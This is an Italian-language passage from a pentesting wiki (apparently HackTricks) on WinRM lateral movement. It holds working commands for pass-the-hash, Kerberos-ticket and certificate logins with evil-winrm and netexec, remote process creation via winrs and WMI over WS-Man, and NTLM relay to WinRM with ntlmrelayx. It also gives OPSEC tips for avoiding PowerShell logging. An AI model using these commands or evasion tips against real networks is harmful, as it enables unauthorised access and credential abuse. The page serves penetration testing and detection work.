# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM è uno dei trasporti di **lateral movement** più comodi negli ambienti Windows perché ti dà una shell remota via **WS-Man/HTTP(S)** senza bisogno di trucchi per la creazione di servizi SMB. Se il target espone **5985/5986** e il tuo principal è autorizzato a usare il remoting, spesso puoi passare da "valid creds" a "interactive shell" molto rapidamente.

Per l'**enumerazione del protocollo/servizio**, i listener, l'abilitazione di WinRM, `Invoke-Command` e l'uso generico del client, controlla:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Usa **HTTP/HTTPS** invece di SMB/RPC, quindi spesso funziona dove l'esecuzione in stile PsExec è bloccata.
- Con **Kerberos**, evita di inviare credenziali riutilizzabili al target.
- Funziona bene con tooling **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Il percorso interattivo di PowerShell remoting avvia **`wsmprovhost.exe`** sul target nel contesto dell'utente autenticato, il che è operativamente diverso dall'esecuzione basata su servizi.

## Access model and prerequisites

In pratica, il lateral movement via WinRM riuscito dipende da **tre** cose:

1. Il target ha un **WinRM listener** (`5985`/`5986`) e regole firewall che consentono l'accesso.
2. L'account può **autenticarsi** all'endpoint.
3. L'account è autorizzato ad **aprire una sessione di remoting**.

Modi comuni per ottenere quell'accesso:

- **Local Administrator** sul target.
- Membership in **Remote Management Users** sui sistemi più recenti o in **WinRMRemoteWMIUsers__** sui sistemi/componenti che ancora rispettano quel gruppo.
- Diritti di remoting esplicitamente delegati tramite local security descriptors / modifiche alle ACL di PowerShell remoting.

Se controlli già una macchina con diritti admin, ricorda che puoi anche **delegare l'accesso WinRM senza la piena membership nel gruppo admin** usando le tecniche descritte qui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos richiede un hostname/FQDN**. Se ti connetti tramite IP, il client di solito fa fallback a **NTLM/Negotiate**.
- In casi edge di **workgroup** o cross-trust, NTLM spesso richiede **HTTPS** oppure che il target venga aggiunto a **TrustedHosts** sul client.
- Con **local accounts** via Negotiate in un workgroup, le restrizioni UAC remote possono impedire l'accesso a meno che non venga usato l'account Administrator integrato o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa di default lo SPN **`HTTP/<host>`**. In ambienti in cui **`HTTP/<host>`** è già registrato a qualche altro service account, WinRM Kerberos può fallire con `0x80090322`; usa uno SPN con porta oppure passa a **`WSMAN/<host>`** dove quello SPN esiste.

Se ottieni credenziali valide durante il password spraying, validarle via WinRM è spesso il modo più rapido per verificare se si traducono in una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM per shell interattive

`evil-winrm` rimane l'opzione interattiva più comoda da Linux perché supporta **password**, **NT hash**, **Kerberos tickets**, **client certificates**, trasferimento file e caricamento in-memory di PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso limite Kerberos SPN: `HTTP` vs `WSMAN`

Quando il default **`HTTP/<host>`** SPN causa fallimenti di Kerberos, prova a richiedere/usare invece un ticket **`WSMAN/<host>`**. Questo si verifica in setup enterprise hardenizzati o anomali dove `HTTP/<host>` è già associato a un altro account di servizio.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Questo è utile anche dopo un abuso di **RBCD / S4U** quando hai forgiato o richiesto specificamente un ticket di servizio **WSMAN** invece di un ticket generico `HTTP`.

### Autenticazione basata su certificato

WinRM supporta anche l’**autenticazione con certificato client**, ma il certificato deve essere associato sul target a un **account locale**. Dal punto di vista offensivo, questo è importante quando:

- hai già rubato/esportato un certificato client valido e la chiave privata già associati a WinRM;
- hai abusato di **AD CS / Pass-the-Certificate** per ottenere un certificato per un principal e poi pivotare verso un altro percorso di autenticazione;
- operi in ambienti che evitano deliberatamente il remoting basato su password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM è molto meno comune rispetto a password/hash/Kerberos auth, ma quando esiste può fornire un percorso di **lateral movement senza password** che sopravvive alla rotazione delle password.

### Python / automation con `pypsrp`

Se hai bisogno di automation invece di una operator shell, `pypsrp` ti offre WinRM/PSRP da Python con supporto per **NTLM**, **certificate auth**, **Kerberos** e **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Movimento laterale WinRM nativo di Windows

### `winrs.exe`

`winrs.exe` è integrato ed è utile quando vuoi **eseguire comandi WinRM nativi** senza aprire una sessione remota interattiva di PowerShell:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operativamente, `winrs.exe` comunemente risulta in una catena di processi remoti simile a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Questo vale la pena ricordarlo perché differisce dall'exec basato su service e dalle sessioni PSRP interattive.

### `winrm.cmd` / WS-Man COM instead of PowerShell remoting

Puoi anche eseguire tramite **WinRM transport** senza `Enter-PSSession` invocando le classi WMI su WS-Man. Questo mantiene il transport come WinRM mentre il primitive di esecuzione remota diventa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Quell’approccio è utile quando:

- Il logging di PowerShell è fortemente monitorato.
- Vuoi il **WinRM transport** ma non un classico workflow di PS remoting.
- Stai costruendo o usando tooling custom attorno all’oggetto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Quando SMB relay è bloccato da signing e LDAP relay è vincolato, **WS-Man/WinRM** può ancora essere un target di relay interessante. `ntlmrelayx.py` moderno include **WinRM relay servers** e può fare relay verso target **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Due note pratiche:

- Relay è più utile quando il target accetta **NTLM** e il principal relayato è autorizzato a usare WinRM.
- Il codice recente di Impacket gestisce specificamente le richieste **`WSMANIDENTIFY: unauthenticated`**, così i probe in stile `Test-WSMan` non interrompono il flusso del relay.

Per i vincoli multi-hop dopo aver ottenuto una prima sessione WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Note OPSEC e di rilevamento

- Il **PowerShell remoting** interattivo crea di solito **`wsmprovhost.exe`** sul target.
- **`winrs.exe`** crea comunemente **`winrshost.exe`** e poi il processo figlio richiesto.
- Aspettati telemetria di **network logon**, eventi del servizio WinRM e PowerShell operational/script-block logging se usi PSRP invece di un raw `cmd.exe`.
- Se ti serve solo un singolo comando, `winrs.exe` o l'esecuzione WinRM one-shot possono essere più silenziosi di una sessione remoting interattiva di lunga durata.
- Se Kerberos è disponibile, preferisci **FQDN + Kerberos** invece di IP + NTLM per ridurre sia i problemi di trust sia le modifiche scomode lato client a `TrustedHosts`.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
